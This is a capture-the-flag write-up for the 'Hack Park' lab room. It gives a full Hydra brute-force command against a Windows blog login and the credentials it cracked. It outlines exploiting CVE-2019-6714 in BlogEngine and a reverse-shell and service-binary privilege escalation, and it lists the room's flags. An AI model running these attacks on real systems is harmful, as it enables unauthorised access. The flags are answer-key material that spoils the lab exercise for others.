Hack Park 
Padsala Tushal 
15 Aug 2022 | 11:41 Am


## Task 1 - Deployment

> Whats the name of the clown displayed on the homepage?
```
Pennywise
```
Google image reverse search

## Task 2- Using Hydra to brute force login

> What request type is the Windows website login form using?
```
post
```

> Guess a username, choose a password wordlist and gain credentials to a user account!
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.39.123 http-form-post '/Account/login.aspx:__VIEWSTATE=wF8jE7RuYKxDBdF7JvnOuQ465WCU8qHQEdc7qO39%2BxkTCvIuMA5IkNdKOJIHqqIPfGk37DsclWWqOFfPkUID3caGd5Dtag%2BlsUXZoBZVZ54%2FVxi1dNnh83%2BqOXQb0cK%2FQgyYgwb%2B%2FHSeSME0Pk3aXvgZ9vKzEdM%2BYeo%2FVhzoJI2xbS%2BT29d3c%2Fvo1XEusqukHE84J0%2FQgTk4MISf1%2FvVW0CuwTdTU58D2SOV1biiUIBAxBDDXhZzmWebU3GW%2BVZSLw01KtI6NME8nPAxsS7xc%2BVh85OZOQdKLm%2BEP1lBc2xZ%2BwqRFw%2FFBwM5bDAlaEKs5dOLBVacd3cjv2C3uzaeZHDSlANuP7jftgoT7jKRvEKOb2Hi&__EVENTVALIDATION=8isXl9F5UUXTB3uTzeF6xSx3VMghZS8647vz7iM8Cj2xlfsIl6fkc7QXHrZE8lNmaBwZOfwyeoLsrBU3%2FRJKJ2gA5Q%2BMZzLtoNbSRFt95I0ivx0CXEomz8Qqy8XZSWL%2F4sb67RzQUtvhUp%2BjAcusnXKiIUYFM%2F2%2FZuUYJmhxxPvXg2GF&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed' -V

```
```
[80][http-post-form] host: 10.10.39.123   login: admin   password: 1qaz2wsx
```

## Task 3 : compromise the machine



Bruteforce -> login -> dashboard -> get version details -> found cve -> exploit via cve(upload,path travsal,..) 

> Now you have logged into the website, are you able to identify the version of the BlogEngine?

```
3.3.6.0
```

> What is the CVE?
```
CVE-2019-6714 
```

> Who is the webserver running as?
```
iis apppool\blog
```

## Task 4 - Privilege Escalation

upload metasploit reverse shell -> execute -> get system details -> found abnormal service -> replace service binary which is runninng as admin with shell -> execute shell


> What is the OS version of this windows machine?
```
Windows 2012 R2 (6.3 Build 9600)
```

> What is the name of the abnormal service running?
```
WindowScheduler
```

> What is the name of the binary you're supposed to exploit? 
```
Message.exe
```
> What is the user flag (on Jeffs Desktop)?
```
759bd8af507517bcfaede78a21a73e39
```

> What is the root flag?
```
7e13d97f05f7ceb9881a3eb3d78d3e72
```


## Task 5 - Privilege Escalation without metasploit

upload WinPeas.exe 

> Using winPeas, what was the Original Install time? (This is date and time)

```
 8/3/2019, 10:43:23 AM
```